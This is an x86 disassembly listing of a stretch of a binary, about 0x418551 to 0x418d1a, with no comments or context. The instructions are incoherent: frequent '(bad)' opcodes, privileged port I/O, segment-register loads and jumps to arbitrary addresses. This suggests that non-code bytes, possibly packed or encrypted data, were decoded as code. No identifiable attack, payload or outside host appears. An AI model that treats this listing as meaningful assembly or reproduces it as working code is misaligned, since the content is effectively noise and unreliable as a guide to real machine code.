  418551:	(bad)  
  418552:	xchg   edi,eax
  418553:	cmp    al,0x1e
  418555:	sbb    eax,0x6eaab5fd
  41855a:	add    al,0x7c
  41855c:	push   ebx
  41855d:	shl    BYTE PTR [ebx+0x25],1
  418560:	call   FWORD PTR [ebx+0x35]
  418563:	cld    
  418564:	imul   ebp,DWORD PTR [ebx-0xf92153],0xffffff8c
  41856b:	in     eax,dx
  41856c:	mov    edi,0x946053df
  418571:	aas    
  418572:	sub    DWORD PTR [eax],esi
  418574:	frstor [ecx+0x70]
  418577:	js     0x4185ad
  418579:	push   0xa759a25
  41857e:	aaa    
  41857f:	add    cl,BYTE PTR [esi]
  418581:	xchg   BYTE PTR [ebx-0x28],dh
  418584:	mov    dh,0xf6
  418586:	xchg   ebp,eax
  418587:	inc    edx
  418588:	shr    BYTE PTR [eax-0x7100adf1],0x2d
  41858f:	jno    0x41857d
  418591:	mov    eax,0x1e8a5b86
  418596:	push   ss
  418597:	retf   
  418598:	sbb    ecx,DWORD PTR [eax+eiz*4]
  41859b:	and    al,cl
  41859d:	hlt    
  41859e:	mov    ds:0x532be561,al
  4185a3:	dec    ebx
  4185a4:	xor    DWORD PTR [ecx-0x33d00ab1],0xb5ff0746
  4185ae:	inc    edi
  4185af:	(bad)  
  4185b0:	je     0x4185a2
  4185b2:	sbb    al,0x28
  4185b4:	mov    al,0xc3
  4185b6:	data16 fldcw WORD PTR [edx]
  4185b9:	outs   dx,DWORD PTR ds:[esi]
  4185ba:	xor    DWORD PTR [edx+0x1e],ecx
  4185bd:	sar    BYTE PTR cs:[edi],0x23
  4185c1:	test   BYTE PTR [esi*2+0xd3edcb3],dh
  4185c8:	lods   eax,DWORD PTR ds:[esi]
  4185c9:	hlt    
  4185ca:	test   al,0xfc
  4185cc:	out    0xca,eax
  4185ce:	sbb    eax,0xfd2def49
  4185d3:	mov    DWORD PTR [eax+0x3254be5c],ebp
  4185d9:	mov    dl,0x93
  4185db:	vpshab xmm5,xmm3,xmm5
  4185e0:	(bad)  
  4185e1:	ret    0xd0f
  4185e4:	lahf   
  4185e5:	repnz scas al,BYTE PTR es:[edi]
  4185e7:	xor    edx,DWORD PTR [edx]
  4185e9:	adc    bh,dl
  4185eb:	inc    edx
  4185ec:	lds    ebp,FWORD PTR [ecx]
  4185ee:	mov    ebx,0xe0c86f0d
  4185f3:	mov    ds:0x6462f1ba,eax
  4185f8:	int    0xf6
  4185fa:	bound  edx,QWORD PTR [edi]
  4185fc:	xchg   esi,eax
  4185fd:	jmp    0x41863a
  4185ff:	iret   
  418600:	push   ss
  418601:	pop    ebp
  418602:	std    
  418603:	xor    ch,BYTE PTR [eax+0x39]
  418606:	xchg   esi,eax
  418607:	aad    0xf2
  418609:	push   0x1837400e
  41860e:	mov    eax,0x49782688
  418613:	xlat   BYTE PTR ds:[ebx]
  418614:	scas   eax,DWORD PTR es:[edi]
  418615:	sbb    eax,0x14e7a31b
  41861a:	push   edx
  41861b:	cdq    
  41861c:	cdq    
  41861d:	stc    
  41861e:	ret    
  41861f:	jecxz  0x418644
  418621:	cmp    cl,al
  418623:	or     al,BYTE PTR [eax+0x34]
  418626:	fs jle 0x4185d0
  418629:	dec    edx
  41862a:	(bad)  
  41862c:	sub    eax,0xdbc8d056
  418631:	(bad)  
  418633:	ds add al,0x49
  418636:	and    dl,BYTE PTR ss:[edx]
  418639:	sti    
  41863a:	(bad)  
  41863b:	inc    ebp
  41863c:	mov    al,ds:0x9ceaafee
  418641:	(bad)  
  418642:	das    
  418643:	push   esp
  418644:	sub    eax,DWORD PTR [edx-0x30]
  418647:	push   0xf9f4b231
  41864c:	rol    ebx,cl
  41864e:	retf   0xf8ec
  418651:	popf   
  418652:	aaa    
  418653:	inc    ecx
  418654:	mov    cs,ebp
  418656:	pop    es
  418657:	out    0x97,eax
  418659:	(bad)  
  41865a:	sti    
  41865b:	cmp    edi,DWORD PTR [eax+ebp*4-0x2c8a2b00]
  418662:	push   esi
  418663:	pop    eax
  418664:	xacquire xchg BYTE PTR [ebx-0x2e8f21ee],dl
  41866b:	rcl    dl,1
  41866d:	add    DWORD PTR [ecx],ecx
  41866f:	dec    esi
  418670:	bound  esi,QWORD PTR [eax-0x4c95d17f]
  418676:	mov    ecx,?
  418678:	xlat   BYTE PTR ds:[ebx]
  418679:	mov    ah,0x7c
  41867b:	arpl   WORD PTR [ecx+0x30eab5d2],bx
  418681:	mov    ecx,0x1ed3912b
  418686:	inc    ecx
  418687:	ror    ebp,cl
  418689:	imul   ecx,esi,0x6e
  41868c:	inc    esp
  41868d:	xchg   ebp,eax
  41868e:	les    ebx,FWORD PTR [eax]
  418690:	mov    esi,0xf09e207e
  418695:	pushf  
  418696:	das    
  418697:	xchg   DWORD PTR [edx+0xa],eax
  41869a:	dec    ebx
  41869b:	outs   dx,DWORD PTR ds:[esi]
  41869c:	add    ebp,esp
  41869e:	mov    al,0x65
  4186a0:	fdivr  DWORD PTR ds:0x54a9b50d
  4186a6:	aad    0x5f
  4186a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186a9:	into   
  4186aa:	out    dx,eax
  4186ab:	fild   DWORD PTR [edi+eax*8-0x2b2b19be]
  4186b2:	lock lods eax,DWORD PTR ds:[esi]
  4186b5:	or     bh,BYTE PTR [ebx]
  4186b7:	(bad)  
  4186b8:	pop    ss
  4186b9:	cmp    dh,bh
  4186bb:	and    eax,DWORD PTR [ebx+edi*8+0x281651ad]
  4186c2:	(bad)  
  4186c3:	cmp    edx,eax
  4186c5:	lods   eax,DWORD PTR ds:[esi]
  4186c6:	jnp    0x4186d4
  4186c8:	sbb    dh,BYTE PTR [edi]
  4186ca:	cli    
  4186cb:	push   0xe0c04b24
  4186d0:	mov    ds:0x5cbec5bc,al
  4186d5:	xchg   esi,eax
  4186d6:	mov    edx,esi
  4186d8:	jnp    0x418677
  4186da:	int3   
  4186db:	jmp    0x41872f
  4186dd:	pop    edx
  4186de:	fidiv  DWORD PTR ds:0x1808c8ee
  4186e4:	xchg   ebp,eax
  4186e5:	dec    ebp
  4186e6:	into   
  4186e7:	sub    ch,BYTE PTR [ebp+ecx*2-0x60]
  4186eb:	fcom   DWORD PTR [esi+0x7661a5a3]
  4186f1:	ret    0x917e
  4186f4:	pop    ss
  4186f5:	xor    edi,edx
  4186f7:	outs   dx,DWORD PTR ds:[esi]
  4186f8:	mov    ss,ebp
  4186fa:	sub    dh,ch
  4186fc:	mov    bl,0x34
  4186fe:	int    0x3f
  418700:	stc    
  418701:	cmp    eax,0xf1f8b6d
  418706:	pop    ds
  418707:	(bad)  
  418708:	ins    BYTE PTR es:[edi],dx
  418709:	js     0x418776
  41870b:	repnz call 0x179e:0x8554fc99
  418713:	sub    ebx,esp
  418715:	inc    eax
  418716:	gs pushf 
  418718:	into   
  418719:	nop
  41871a:	push   ecx
  41871b:	inc    esi
  41871c:	in     al,0x55
  41871e:	(bad)
  418722:	adc    edx,DWORD PTR [edx+0x5f08c230]
  418728:	pop    edi
  418729:	jl     0x41870f
  41872b:	pop    esp
  41872c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41872d:	xor    dl,BYTE PTR [edx+edx*8+0x4c60c761]
  418734:	mov    eax,0xc9bdcc97
  418739:	int    0x5c
  41873b:	and    DWORD PTR [ebx+0x15],ebp
  41873e:	(bad)  [ebp-0x4e50e7e9]
  418744:	ret    0x8578
  418747:	jmp    0xd5ee:0x83e9cc37
  41874e:	sti    
  41874f:	aaa    
  418750:	push   eax
  418751:	lock pop ds
  418753:	sahf   
  418754:	mov    bl,0x1b
  418756:	cdq    
  418757:	jle    0x418716
  418759:	inc    edx
  41875a:	pushf  
  41875b:	mov    al,ds:0x375c1190
  418760:	add    BYTE PTR [ebx+0x4a],al
  418763:	in     eax,0xc0
  418765:	repnz lds edi,FWORD PTR ds:0xfe8bac32
  41876c:	icebp  
  41876d:	mov    al,ds:0xa0c70c4c
  418772:	inc    ebx
  418773:	adc    BYTE PTR [ecx+eax*8+0x2],al
  418777:	xor    BYTE PTR [ebx+0x1d],al
  41877a:	int    0x32
  41877c:	and    ch,ch
  41877e:	lods   eax,DWORD PTR ds:[esi]
  41877f:	adc    DWORD PTR [ecx],0xeab1028f
  418785:	into   
  418786:	test   eax,0x8a86a583
  41878b:	adc    DWORD PTR [ecx+0x12728f21],edx
  418791:	cvtpi2ps xmm0,QWORD PTR [ecx-0x1ac8a431]
  418798:	out    0x2d,al
  41879a:	add    edx,DWORD PTR [eax-0x7c]
  41879d:	inc    eax
  41879e:	lea    ebx,[edi+esi*1+0x76]
  4187a2:	cld    
  4187a3:	and    edi,edi
  4187a5:	jno    0x418791
  4187a7:	push   0xffffff8b
  4187a9:	loop   0x41882a
  4187ab:	test   al,0xd1
  4187ad:	pop    es
  4187ae:	sbb    ch,BYTE PTR [ebp+0x5321fbb2]
  4187b4:	adc    eax,0xf5a229ce
  4187b9:	lds    ebx,FWORD PTR [esi]
  4187bb:	mov    edi,0xc5064769
  4187c0:	mov    edx,0x956bdb7d
  4187c5:	or     BYTE PTR [eax],al
  4187c7:	jmp    0x42e4fe73
  4187cc:	sub    al,0x27
  4187ce:	mov    BYTE PTR [eax-0x30a1a873],cl
  4187d4:	xchg   ebp,eax
  4187d5:	add    bh,dh
  4187d7:	jno    0x418851
  4187d9:	mov    WORD PTR [edi+0x61],ds
  4187dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187dd:	pop    eax
  4187de:	and    BYTE PTR [ecx+0x2567fb3b],ch
  4187e4:	lock pop ecx
  4187e6:	fs loopne 0x418787
  4187e9:	icebp  
  4187ea:	shl    ebx,1
  4187ec:	imul   ebp,ecx,0xe370e60f
  4187f2:	mov    ebx,0x58ea2e13
  4187f7:	(bad)  
  4187f8:	cwde   
  4187f9:	inc    ebp
  4187fa:	sub    BYTE PTR [edi-0x488d0862],0x45
  418801:	mov    ch,0xa0
  418803:	test   BYTE PTR [esi],bl
  418805:	xor    eax,eax
  418807:	or     edx,ebp
  418809:	inc    ecx
  41880a:	dec    ebp
  41880b:	pusha  
  41880c:	repnz movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41880f:	xor    al,0xd2
  418811:	popa   
  418812:	ss cs cld 
  418815:	lods   eax,DWORD PTR ds:[esi]
  418816:	add    BYTE PTR [ecx-0x6fc18db2],bh
  41881c:	daa    
  41881d:	cmp    DWORD PTR [esi],esi
  41881f:	lods   eax,DWORD PTR ds:[esi]
  418820:	pusha  
  418821:	fs mov dl,0x20
  418824:	dec    edx
  418825:	add    DWORD PTR [esi],0x568d3985
  41882b:	mov    ds:0xd4bb54be,al
  418830:	sahf   
  418831:	adc    BYTE PTR [ecx-0x4f2b5658],dh
  418837:	inc    esp
  418838:	icebp  
  418839:	lea    ebp,[ebx]
  41883b:	int3   
  41883c:	pop    ss
  41883d:	cmp    BYTE PTR fs:[ebx-0x3ef246e0],0x9c
  418845:	adc    DWORD PTR [ebx+0x62],ecx
  418848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418849:	iret   
  41884a:	aad    0x27
  41884c:	push   esp
  41884d:	mov    eax,0xee8af3ae
  418852:	cdq    
  418853:	mov    ?,WORD PTR [edi-0x7a]
  418856:	aas    
  418857:	xchg   BYTE PTR [edx+eiz*2+0x372ec14],al
  41885e:	jge    0x41887a
  418860:	je     0x41882a
  418862:	xchg   esp,eax
  418863:	call   0x6332d66
  418868:	jae    0x418868
  41886a:	pop    edi
  41886b:	jno    0x4188da
  41886d:	test   BYTE PTR [esi-0x5bfb59ac],dl
  418873:	imul   edi,DWORD PTR [esi-0xa],0x126e0af7
  41887a:	jp     0x4188ea
  41887c:	dec    ebx
  41887d:	sub    ebx,edi
  41887f:	add    eax,0x66891a5a
  418884:	jnp    0x418838
  418886:	adc    dh,BYTE PTR [edi-0x72]
  418889:	or     al,0x34
  41888b:	adc    bl,BYTE PTR [ebx+0x6]
  41888e:	and    esi,DWORD PTR [ebx+esi*1-0xc119726]
  418895:	shr    BYTE PTR [esp+ebx*2+0x33573ee5],0x82
  41889d:	pusha  
  41889e:	sub    DWORD PTR [edx+0x75],esi
  4188a1:	add    eax,edi
  4188a3:	sbb    dh,BYTE PTR [edx]
  4188a5:	cld    
  4188a6:	test   DWORD PTR [ebx-0x3b],esp
  4188a9:	rcr    DWORD PTR [ecx+0x483dc44e],1
  4188af:	jecxz  0x418869
  4188b1:	jl     0x4188cb
  4188b3:	jmp    FWORD PTR [ecx]
  4188b5:	sbb    DWORD PTR [ecx],0x6a
  4188b8:	das    
  4188b9:	add    DWORD PTR [ecx-0x4c1b835e],edx
  4188bf:	or     eax,0xfcc44051
  4188c4:	pop    edi
  4188c5:	sbb    BYTE PTR [ebx+0x7f],0x49
  4188c9:	xor    bl,bh
  4188cb:	xor    edx,DWORD PTR [ecx+0x2b]
  4188ce:	je     0x4188aa
  4188d0:	cwde   
  4188d1:	add    DWORD PTR [edi],edi
  4188d3:	pop    edi
  4188d4:	sbb    eax,0x99a4d7
  4188da:	dec    edx
  4188db:	add    DWORD PTR [ecx-0x2d7ed1af],ebx
  4188e1:	add    DWORD PTR ds:0x68a786e0,0x51
  4188e8:	pop    es
  4188e9:	repz cmp BYTE PTR [ebx],al
  4188ec:	stc    
  4188ed:	imul   ebx,DWORD PTR [edx-0x576c8f18],0xd9fc8d0c
  4188f7:	sbb    bl,bl
  4188f9:	cmp    BYTE PTR [eax],bl
  4188fb:	add    ecx,DWORD PTR [eax-0x4]
  4188fe:	sub    al,0xf9
  418900:	call   0x1cfe9ab1
  418905:	ret    
  418906:	pop    es
  418907:	(bad)  
  418909:	popa   
  41890a:	sub    al,0xc1
  41890c:	and    eax,0xf714c164
  418911:	out    0x0,eax
  418913:	add    eax,0x3f566426
  418918:	mov    cl,0x1
  41891a:	xlat   BYTE PTR ds:[ebx]
  41891b:	xchg   ecx,eax
  41891c:	mov    esi,0xcf6d6a35
  418921:	cmc    
  418922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418923:	sub    al,0x57
  418925:	xlat   BYTE PTR ds:[ebx]
  418926:	out    dx,eax
  418927:	cwde   
  418928:	mov    WORD PTR [edx],ds
  41892a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41892b:	cwde   
  41892c:	sbb    DWORD PTR [ebx],ebp
  41892e:	sub    BYTE PTR [edi],al
  418930:	test   DWORD PTR [eax-0x3deec1f5],ebx
  418936:	inc    esp
  418937:	xchg   ebp,eax
  418938:	jecxz  0x418928
  41893a:	lods   eax,DWORD PTR ds:[esi]
  41893b:	in     al,0x9f
  41893d:	push   ds
  41893e:	and    eax,0x61fb04e
  418943:	push   edi
  418944:	mul    bh
  418946:	push   esp
  418947:	and    ebp,ebx
  418949:	imul   esi,DWORD PTR [eax-0x47],0xd069520c
  418950:	push   edi
  418951:	push   es
  418952:	jmp    0xfedb7868
  418957:	mov    ebp,0xd8e71c90
  41895c:	hlt    
  41895d:	hlt    
  41895e:	test   BYTE PTR [ecx-0x31],bl
  418961:	jmp    0x41898b
  418963:	adc    al,BYTE PTR [ebp-0x25]
  418966:	test   al,0xcb
  418968:	stc    
  418969:	mov    ah,0x40
  41896b:	aas    
  41896c:	push   ss
  41896d:	dec    esp
  41896e:	(bad)  
  41896f:	dec    esi
  418970:	add    BYTE PTR [ecx-0x22956d5e],cl
  418976:	mov    cs,WORD PTR [edi+0x42]
  418979:	out    dx,eax
  41897a:	mov    dh,0xfb
  41897c:	pushf  
  41897d:	mov    eax,0xe867fdfb
  418982:	sbb    al,0x60
  418984:	xchg   ebx,eax
  418985:	xchg   ebp,eax
  418986:	rcl    DWORD PTR [ebp-0x584deb96],0xa1
  41898d:	pop    ss
  41898e:	and    ah,cl
  418990:	retf   0xd418
  418993:	cs xchg ebx,eax
  418995:	les    ecx,FWORD PTR [eax+0x571559e9]
  41899b:	fisub  WORD PTR [esi+0x4b]
  41899e:	shr    DWORD PTR fs:[esi+0x42a29ec2],0xaa
  4189a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189a7:	push   0x8a892c0b
  4189ac:	inc    esp
  4189ad:	inc    eax
  4189ae:	mov    ch,0xb7
  4189b0:	pop    esp
  4189b1:	lods   al,BYTE PTR ds:[esi]
  4189b2:	mov    edi,0x29587cc4
  4189b7:	pop    esi
  4189b8:	jle    0x418962
  4189ba:	hlt    
  4189bb:	stc    
  4189bc:	test   eax,0xce559980
  4189c1:	sub    DWORD PTR [edx+0x394d82ae],ebp
  4189c7:	and    eax,0x1a62274e
  4189cc:	stos   BYTE PTR es:[edi],al
  4189cd:	adc    al,0x3b
  4189cf:	dec    esp
  4189d0:	mov    esi,0x24385e06
  4189d5:	fucomi st,st(1)
  4189d7:	cmp    eax,0x375c0eb3
  4189dc:	cmp    al,0x70
  4189de:	sbb    ah,BYTE PTR [edi-0x24]
  4189e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189e2:	mov    ecx,0x9d71c7fd
  4189e7:	addr16 and DWORD PTR [bx-0x6fc2],ecx
  4189ed:	adc    dl,BYTE PTR [edi+0x26d5c577]
  4189f3:	in     al,0x31
  4189f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f6:	push   ss
  4189f7:	sahf   
  4189f8:	cmp    DWORD PTR [ebx-0x6dda6564],0x78756e07
  418a02:	or     bh,dh
  418a04:	push   ebp
  418a05:	mov    dh,0xc0
  418a07:	cmp    DWORD PTR [ebp-0xf],ebx
  418a0a:	mov    ss,WORD PTR [esi+0x740bfebb]
  418a10:	pop    edi
  418a11:	sbb    dh,0x4
  418a14:	xchg   ebp,eax
  418a15:	scas   eax,DWORD PTR es:[edi]
  418a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a17:	lea    esi,[eax-0x7e8b241c]
  418a1d:	fild   WORD PTR [edi]
  418a1f:	push   ebp
  418a20:	ror    DWORD PTR [ebx],cl
  418a22:	jne    0x4189ab
  418a24:	in     al,dx
  418a25:	push   edi
  418a26:	bnd jb 0x418a81
  418a29:	mov    edx,DWORD PTR [edx]
  418a2b:	(bad)  
  418a2c:	mov    eax,0x549f1f69
  418a31:	push   esi
  418a32:	nop
  418a33:	cdq    
  418a34:	adc    bl,cl
  418a36:	push   ds
  418a37:	pop    ss
  418a38:	pop    ss
  418a39:	add    edx,DWORD PTR [edi+0x5b]
  418a3c:	cmp    ecx,0x60e663c5
  418a42:	in     al,0x18
  418a44:	dec    ebp
  418a45:	dec    edx
  418a46:	outs   dx,DWORD PTR ds:[esi]
  418a47:	sbb    eax,0x4ad07f0f
  418a4c:	xor    eax,0x4cb58de4
  418a51:	es xchg esi,eax
  418a53:	call   DWORD PTR [ebp+0x4a]
  418a56:	cmp    ebp,ebp
  418a58:	arpl   WORD PTR [eax],sp
  418a5a:	stc    
  418a5b:	add    edi,DWORD PTR [edi-0x6d6871d]
  418a61:	js     0x4189e7
  418a63:	stc    
  418a64:	pop    ss
  418a65:	out    0xc0,al
  418a67:	rcl    BYTE PTR [ebp+edx*8+0x62bd2ec0],cl
  418a6e:	dec    ebx
  418a6f:	jge    0x418a67
  418a71:	shr    DWORD PTR [ebp+0x7722156b],1
  418a77:	pop    es
  418a78:	ds lahf 
  418a7a:	test   al,0x99
  418a7c:	lods   al,BYTE PTR ds:[esi]
  418a7d:	xchg   edi,eax
  418a7e:	pop    edx
  418a7f:	ja     0x418aed
  418a81:	rcr    BYTE PTR [edi],0x40
  418a84:	call   0xdfedb11c
  418a89:	mov    edi,0x6fbb847b
  418a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a8f:	mov    al,ds:0xe63e34ad
  418a94:	add    dh,bh
  418a96:	mov    ds:0x17da4760,al
  418a9b:	pop    es
  418a9c:	inc    eax
  418a9d:	push   cs
  418a9e:	int    0x9f
  418aa0:	adc    BYTE PTR [edi+0x3f],dh
  418aa3:	out    dx,al
  418aa4:	sub    BYTE PTR [eax],ch
  418aa6:	clc    
  418aa7:	xchg   edx,eax
  418aa8:	rcr    DWORD PTR [eax],cl
  418aaa:	xor    al,BYTE PTR [edi]
  418aac:	mov    edi,0x181cf5
  418ab1:	retf   0x5738
  418ab4:	lods   al,BYTE PTR ds:[esi]
  418ab5:	mov    ds:0x8a7977b4,al
  418aba:	stos   DWORD PTR es:[edi],eax
  418abb:	(bad)  
  418abc:	bnd jg 0x418a42
  418abf:	repz scas al,BYTE PTR es:[edi]
  418ac1:	adc    eax,0x9142d6c4
  418ac6:	push   ebx
  418ac7:	sbb    bl,bh
  418ac9:	dec    esp
  418aca:	lahf   
  418acb:	fsub   QWORD PTR [ebp+0x6d2ad0d7]
  418ad1:	aam    0x82
  418ad3:	cmc    
  418ad4:	ja     0x418b2c
  418ad6:	jg     0x418ac8
  418ad8:	xchg   edi,eax
  418ad9:	fst    QWORD PTR [esi]
  418adb:	lea    esi,[edi]
  418add:	out    0xdc,eax
  418adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ae0:	xchg   BYTE PTR [edx],dh
  418ae2:	or     al,0xfd
  418ae4:	frstor [ebx+eiz*1]
  418ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ae8:	push   esp
  418ae9:	push   eax
  418aea:	jp     0x418a90
  418aec:	stos   BYTE PTR es:[edi],al
  418aed:	ret    
  418aee:	and    ecx,DWORD PTR [esi]
  418af0:	xchg   ebp,eax
  418af1:	add    eax,0xc2e2741d
  418af6:	xor    esp,esp
  418af8:	xlat   BYTE PTR ds:[ebx]
  418af9:	mov    eax,esi
  418afb:	sar    DWORD PTR [edx-0x14],0xe4
  418aff:	dec    eax
  418b00:	and    bh,BYTE PTR [ebx-0x47b73eba]
  418b06:	repz jl 0x418a9a
  418b09:	add    BYTE PTR [ebp-0x729ec039],cl
  418b0f:	push   DWORD PTR [edi-0x2e9551c]
  418b15:	xor    DWORD PTR [esi],edx
  418b17:	pop    edi
  418b18:	nop
  418b19:	xor    esi,DWORD PTR [ebp+0x5d]
  418b1c:	int    0xe3
  418b1e:	popf   
  418b1f:	dec    eax
  418b20:	dec    ebp
  418b21:	inc    edx
  418b22:	shr    DWORD PTR [edx],cl
  418b24:	sub    DWORD PTR [eax+0xd6d183b],eax
  418b2a:	adc    edi,esi
  418b2c:	mov    dl,0xd6
  418b2e:	mov    cl,0x1
  418b30:	icebp  
  418b31:	sar    BYTE PTR [edx],cl
  418b33:	nop
  418b34:	mov    al,ds:0x603210d
  418b39:	cmp    dh,BYTE PTR [eax+0x68da97ac]
  418b3f:	ss push edi
  418b41:	clc    
  418b42:	mov    ebp,0x65ec3044
  418b47:	hlt    
  418b48:	dec    esp
  418b49:	(bad)  
  418b4a:	sub    al,0x4a
  418b4c:	stos   BYTE PTR es:[edi],al
  418b4d:	xchg   ebp,eax
  418b4e:	inc    ebp
  418b4f:	stos   DWORD PTR es:[edi],eax
  418b50:	xor    DWORD PTR [ebx-0x12881433],edi
  418b56:	inc    esp
  418b57:	call   0x986e8edd
  418b5c:	daa    
  418b5d:	cli    
  418b5e:	adc    BYTE PTR [edx-0x2d],ch
  418b61:	sahf   
  418b62:	cdq    
  418b63:	or     DWORD PTR [edx-0x5960ec26],0x2b
  418b6a:	mov    BYTE PTR [edi-0x64],ah
  418b6d:	cmp    cl,dh
  418b6f:	daa    
  418b70:	int    0xd9
  418b72:	arpl   WORD PTR [edx-0x142f1397],bx
  418b78:	gs push eax
  418b7a:	retf   0xb537
  418b7d:	pop    esi
  418b7e:	push   edi
  418b7f:	dec    ebx
  418b80:	gs jno 0x418b74
  418b83:	pop    ds
  418b84:	std    
  418b85:	fwait
  418b86:	sbb    bh,dl
  418b88:	leave  
  418b89:	rcl    DWORD PTR [ebx-0x30],1
  418b8c:	in     eax,dx
  418b8d:	test   eax,0x16463946
  418b92:	nop
  418b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b94:	ret    
  418b95:	mov    BYTE PTR [eax-0x48],cl
  418b98:	xchg   esp,eax
  418b99:	add    al,0x85
  418b9b:	stc    
  418b9c:	cmp    BYTE PTR [esi],dh
  418b9e:	int3   
  418b9f:	xor    bl,BYTE PTR ds:0x77fda4d9
  418ba5:	push   ebp
  418ba6:	(bad)  
  418ba8:	push   ss
  418ba9:	mov    al,ds:0xf3577bfd
  418bae:	int3   
  418baf:	cmp    BYTE PTR [eax-0x624bb574],ah
  418bb5:	stc    
  418bb6:	xor    ebx,edi
  418bb8:	pop    edi
  418bb9:	mov    ds:0x65dd5148,al
  418bbe:	stc    
  418bbf:	enter  0x1db,0xef
  418bc3:	fisubr WORD PTR [ecx-0x17]
  418bc6:	push   0xa2a66a9c
  418bcb:	cwde   
  418bcc:	and    DWORD PTR [edi+0x340b1a],eax
  418bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd3:	push   esp
  418bd4:	inc    esp
  418bd6:	data16 addr16 aad 0xe4
  418bda:	xchg   ecx,eax
  418bdb:	mov    ebx,0x274709e8
  418be0:	mov    WORD PTR [edx],es
  418be2:	mov    ebx,DWORD PTR [ecx-0x53]
  418be5:	push   esp
  418be6:	push   cs
  418be7:	push   ds
  418be8:	sub    ah,BYTE PTR [ecx]
  418bea:	sbb    BYTE PTR [edi+0x26],ah
  418bed:	adc    ecx,esi
  418bef:	sahf   
  418bf0:	sbb    bh,BYTE PTR [eax+0x7]
  418bf3:	fcmovnu st,st(2)
  418bf5:	cmp    DWORD PTR [esi],edi
  418bf7:	frstor [eax+0x5946ef80]
  418bfd:	shl    DWORD PTR ds:0xf4a793c8,1
  418c03:	mov    esp,0x8b5b0f9f
  418c08:	in     al,dx
  418c09:	and    DWORD PTR [edx+0x6],edx
  418c0c:	mov    ebx,edx
  418c0e:	std    
  418c0f:	and    eax,ebp
  418c11:	ss clc 
  418c13:	dec    edx
  418c14:	test   al,0x30
  418c16:	addps  xmm3,XMMWORD PTR [ecx+0x2f]
  418c1a:	mov    ecx,0xd39c503
  418c1f:	lea    edx,[ecx]
  418c21:	call   0xff6d:0xc4b283bc
  418c28:	ror    BYTE PTR [esi],cl
  418c2a:	fs test eax,0x7fe8c475
  418c30:	sbb    DWORD PTR [ecx],0x860bdbb6
  418c36:	inc    ecx
  418c37:	imul   edx,ecx,0xd4da8a91
  418c3d:	fbld   TBYTE PTR [eax-0x9a728b7]
  418c43:	shl    DWORD PTR [edx+0x14],0x61
  418c47:	push   ecx
  418c48:	(bad)  
  418c49:	das    
  418c4a:	jbe    0x418be9
  418c4c:	add    DWORD PTR [ebx+esi*8+0x42071eef],esi
  418c53:	repz repz jb 0x418c97
  418c57:	inc    edx
  418c58:	loop   0x418c1b
  418c5a:	or     DWORD PTR [ebp-0xc9a78f6],ebx
  418c60:	sti    
  418c61:	lods   al,BYTE PTR ds:[esi]
  418c62:	mov    ecx,0x950edcf6
  418c67:	ret    
  418c68:	(bad)  
  418c69:	sbb    eax,0x8197fedf
  418c6e:	pop    ecx
  418c6f:	mov    WORD PTR [ebp+0x705a36e9],cs
  418c75:	in     eax,dx
  418c76:	dec    ebp
  418c77:	mov    dh,0xfa
  418c79:	fnstcw WORD PTR [edx]
  418c7b:	xchg   ebp,eax
  418c7c:	dec    ecx
  418c7d:	jmp    0x418cfa
  418c7f:	(bad)  
  418c80:	push   0x3cffeb1b
  418c85:	sahf   
  418c86:	leave  
  418c87:	sbb    BYTE PTR [ebx+ecx*8-0x26],bh
  418c8b:	mov    esp,0x3424a71b
  418c90:	xor    BYTE PTR [eax],ch
  418c92:	push   ds
  418c93:	stc    
  418c94:	enterw 0x5800,0x6d
  418c99:	shl    al,0x26
  418c9c:	jno    0x418c85
  418c9e:	dec    ecx
  418c9f:	dec    ebp
  418ca0:	or     dh,bh
  418ca2:	mov    al,al
  418ca4:	out    0xee,al
  418ca6:	jb     0x418cac
  418ca8:	int3   
  418ca9:	adc    al,0xd
  418cab:	cmp    esp,DWORD PTR ds:0x6f8ecab5
  418cb1:	jg     0x418c55
  418cb3:	mov    ds:0x76dfb992,al
  418cb8:	adc    al,0xd9
  418cba:	mov    al,0x1e
  418cbc:	fsubrp st(1),st
  418cbe:	loopne 0x418c63
  418cc0:	inc    edx
  418cc1:	ja     0x418d0d
  418cc3:	cmp    bl,BYTE PTR [ebx+esi*1]
  418cc6:	test   eax,0x78938c7a
  418ccb:	(bad)  
  418ccc:	(bad)  
  418ccd:	or     BYTE PTR [edx+0x131efc96],dl
  418cd3:	aaa    
  418cd4:	mov    ch,BYTE PTR [ecx+0x4a]
  418cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd8:	in     al,dx
  418cd9:	test   DWORD PTR [ecx],edx
  418cdb:	aad    0x69
  418cdd:	mov    bh,bl
  418cdf:	pop    edx
  418ce0:	cmp    ch,BYTE PTR [ecx-0x14]
  418ce3:	nop
  418ce4:	pop    es
  418ce5:	mov    eax,0x61511f0b
  418cea:	stos   BYTE PTR es:[edi],al
  418ceb:	es xor eax,0x3001c5c9
  418cf1:	mov    al,ds:0xa038dd61
  418cf6:	stc    
  418cf7:	pop    ecx
  418cf8:	rcl    DWORD PTR [ecx+ebx*4+0x4cf5bf5c],1
  418cff:	stos   BYTE PTR es:[edi],al
  418d00:	or     al,0x7d
  418d02:	je     0x418d4c
  418d04:	ins    DWORD PTR es:[edi],dx
  418d05:	mov    ecx,0xb974d394
  418d0a:	js     0x418cb2
  418d0c:	mov    eax,ds:0xdf918027
  418d11:	test   al,0x33
  418d13:	(bad)  
  418d14:	cmp    ch,cl
  418d16:	ins    BYTE PTR es:[edi],dx
  418d17:	jp     0x418cde
  418d19:	ret    
  418d1a:	mov    al,ds:0x94901035
